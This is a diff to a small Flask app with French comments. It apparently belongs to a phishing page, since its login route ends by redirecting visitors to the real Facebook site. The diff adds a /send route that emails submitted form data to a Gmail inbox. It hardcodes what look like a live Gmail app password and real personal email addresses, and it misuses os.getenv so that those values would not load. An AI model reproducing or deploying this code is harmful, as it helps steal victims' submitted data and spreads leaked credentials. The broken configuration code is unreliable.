@@ -1,6 +1,11 @@
 from flask import Flask, render_template, request, redirect, url_for
 import random
 import os
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+
 
 app = Flask(__name__)
 
@@ -29,6 +34,34 @@ def login():
 
     # Rediriger vers le lien
     return redirect("https://web.facebook.com/?_rdc=1&_rdr#")
+
+
+
+
+
+# Tu peux stocker ces infos dans des variables d'environnement
+EMAIL_SENDER = os.getenv('bettybe446@gmail.com')       # tonemail@gmail.com
+EMAIL_PASSWORD = os.getenv('ztjg nsyd wfbm tgog')   # mot de passe d'application Gmail
+EMAIL_RECEIVER = os.getenv('traorefahadaziz446@gmail.com')   # où tu veux recevoir le mail
+
+@app.route('/send', methods=['POST'])
+def send_email():
+    subject = 'Test Email depuis Flask'
+    body = f"Message reçu : {request.form.get('message')}"
+
+    msg = MIMEMultipart()
+    msg['From'] = EMAIL_SENDER
+    msg['To'] = EMAIL_RECEIVER
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body, 'plain'))
+
+    try:
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
+            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
+        return "✅ Email envoyé !"
+    except Exception as e:
+        return f"❌ Erreur : {e}"
     
 
 if __name__ == '__main__':
